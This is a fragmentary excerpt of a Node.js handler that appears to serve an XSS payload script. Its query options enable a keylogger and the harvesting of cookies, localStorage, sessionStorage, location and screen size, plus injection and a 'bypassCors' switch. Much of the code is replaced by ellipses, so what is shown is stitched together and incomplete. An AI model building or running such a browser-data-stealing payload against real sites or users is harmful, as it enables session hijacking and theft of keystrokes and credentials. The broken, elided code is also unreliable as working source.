...
module.exports = (req, res) => {
    ...
    if (req.query.inject === 'true')
        inject = true;
    let keylogger = false;
    if (req.query.keylogger === 'true')
        keylogger = true;
    let screenSize = true;
    if (req.query.screenSize === 'false')
        screenSize = false;
    let location = true;
    if (req.query.location === 'false')
        location = false;
    let localStorage = true;
    if (req.query.localStorage === 'false')
        localStorage = false;
    let sessionStorage = true;
    if (req.query.sessionStorage === 'false')
        sessionStorage = false;
    let cookies = true;
    if (req.query.cookies === 'false')
        cookies = false;
    let bypassCors = false;
    if (req.query.bypassCors === 'true')
        bypassCors = true;
  ...
  // └────────────────┴─────────┴──────────┘`;
    ...
    ` + injectScript;
      ...
      var d = document,` +
        ...
        res.setHeader('Content-Type', 'application/javascript');
        let script = help;
        res.status(400).send(beautify(script, {
            indent_size: 2
        }));
    }
    if (config.debug) {
        console.log(chalk.greenBright('[Payload] ') +
